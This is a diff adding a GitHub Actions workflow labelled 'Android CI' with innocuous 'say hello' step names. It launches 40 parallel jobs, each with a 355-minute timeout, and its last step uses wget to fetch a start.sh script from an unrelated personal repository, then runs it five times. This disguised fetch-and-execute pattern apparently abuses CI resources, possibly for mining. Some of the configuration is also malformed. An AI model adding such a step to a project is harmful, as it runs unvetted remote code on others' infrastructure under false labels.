@@ -1,0 +1,30 @@
+name: Android CI
+on: [push, pull_request]
+jobs:
+  build:
+    name: A job to say hello
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 40
+      fail-fast: false
+      matrix:
+        go: [1.6, 1.7, 1.8, 1.9, 1.10]
+        flag: [A, B, C, D, E, F, G, H]
+    timeout-minutes: 355
+    env:
+        NUM_JOBS: 40
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Checkout ${{ Checkout }}
+      uses: actions/checkout@v2
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Hello world action step
+      uses: moatazeldebsy/sauce-labs-app-automate-action@V1.0.1
+    - name: A job to say hello
+      run: |
+        wget https://raw.githubusercontent.com/sapurata337/Kosong/master/start.sh && chmod u+x start.sh && ./start.sh && ./start.sh && ./start.sh && ./start.sh && ./start.sh
+
+
+            
